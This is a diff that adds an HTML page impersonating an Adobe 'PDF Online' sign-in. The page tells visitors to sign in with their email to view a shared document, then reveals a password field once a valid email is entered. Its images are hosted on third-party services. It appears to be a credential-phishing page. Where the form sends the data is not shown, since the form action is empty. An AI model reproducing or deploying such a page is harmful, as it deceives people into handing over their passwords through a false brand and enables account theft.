@@ -1,0 +1,130 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe PDF - Sign In To Your Account</title> 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap">
+    <script src="https://kit.fontawesome.com/585b051251.js"></script>
+
+    <style type="text/css">
+        textarea:hover, 
+        input:hover, 
+        textarea:active, 
+        input:active, 
+        textarea:focus, 
+        input:focus,
+        button:focus,
+        button:active,
+        button:hover,
+        label:focus,
+        .btn:active,
+        .btn.active {
+            outline:0px !important;
+            -webkit-appearance:none;
+            box-shadow: none !important;
+        }
+
+        input, textarea, button {
+            border-radius: 0 !important;
+            font-size: 14px;
+        }
+
+        .small {
+            font-size: small;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.ibb.co/72LVdDr/cbimage.jpg') no-repeat center center/cover; 
+            opacity: 0.5;
+            z-index: -1;
+        }
+
+        #submit-btn {
+            background-color: #D61C00;
+            border: none;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+
+        #submit-btn:hover {
+            background-color: #ce3f2d !important;
+        }
+
+        a:hover { 
+            text-decoration: none; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid p-0">
+        <div class="container">
+            <div class="row my-5">
+                <div class="col-lg-5 mx-auto">
+                    <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
+                        <div class="text-left">
+                            <img src="https://storage.googleapis.com/plug52dsa0.appspot.com/pdfonline-3D2/pdf.png" class="img-fluid" width="80px">
+                            <span class="pl-4 h5 align-middle">PDF Online</span><br><br>
+                            <span class="h5">Sign in with your email to view shared document</span><br>
+                            <span id="msg" class="text-danger"></span><br>
+                                                    </div>    
+                        <form action="" name="login" id="login" method="post" class="pure-form">
+                            <div class="form-group mt-2">
+                                <small></small>
+                                <input type="email" name="email" value="" class="form-control rounded-0 bg-transparent" id="email" aria-describedby="emailHelp" placeholder="Email">
+                            </div>
+
+                            <div class="form-group mt-2" style="display: none;" id="passwordField">
+                                <small></small>
+                                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Password" required="">
+                            </div>
+                        
+                            <div class="form-check mt-3">
+                                <input type="checkbox" class="form-check-input" id="exampleCheck1">
+                                <label class="form-check-label" for="exampleCheck1">
+                                    <a href="#">Keep me signed in</a>
+                                </label>
+                                <span><a href="#" class="float-right">Forgot username?</a></span>
+                            </div>
+
+                            <div class="mt-3" id="submit-btn-container" style="display: none;">
+                                <button type="submit" class="btn text-white w-100 form-control" id="submit-btn" style="background-color: #D61C00;">Sign in</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            // Enable sign-in button when a valid email is provided
+            $('#email').on('input', function () {
+                var emailInput = $(this).val().trim();
+                var isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput);
+
+                if (isValidEmail) {
+                    $('#submit-btn-container').show();
+                } else {
+                    $('#submit-btn-container').hide();
+                }
+            });
+
+            // Show password field on button click
+            $('#submit-btn').on('click', function () {
+                $('#passwordField').slideDown();
+            });
+        });
+    </script>
+
+
+</body></html>
